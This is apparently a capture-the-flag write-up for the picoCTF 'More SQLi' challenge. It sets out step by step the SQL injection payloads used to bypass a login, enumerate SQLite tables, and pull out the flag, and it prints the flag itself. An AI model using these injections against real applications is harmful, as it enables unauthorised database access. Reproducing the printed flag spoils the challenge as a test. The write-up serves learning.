## More SQLi

[Link to challenge](https://play.picoctf.org/practice/challenge/358)

Write-up:

1. We are given a login form. Attempting to login as `admin:admin` shows us the
query used: `SELECT id FROM users WHERE password = 'admin' AND username = 'admin'`

2. After trying multiple payloads, we see that setting password to `'or 1=1;--` allows
us to log in.

3. We find a table with 3 columns, and there's a hint telling us to search all tables. <br>
`' UNION SELECT sqlite_version(), 2, 3-- ` shows us we are dealing with SQLite-

4. `' UNION SELECT name, 2, 3 FROM sqlite_master WHERE type='table'-- ` lists all 
tables: `hints`, `more_table`, `offices` and `users`.

5. `' UNION SELECT sql, 2, 3 FROM sqlite_master WHERE type='table' AND name='hints'-- ` shows us: <br>
`CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)` <br>

    Displaying the hints table shows us nothing of relevance.

6. `' UNION SELECT sql, 2, 3 FROM sqlite_master WHERE type='table' AND name='more_tables'-- ` to 
display `more_tables`. It shows us the following: <br>
`CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)`

7. `' UNION SELECT id, flag, 3 FROM more_table-- ` returns the flag: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}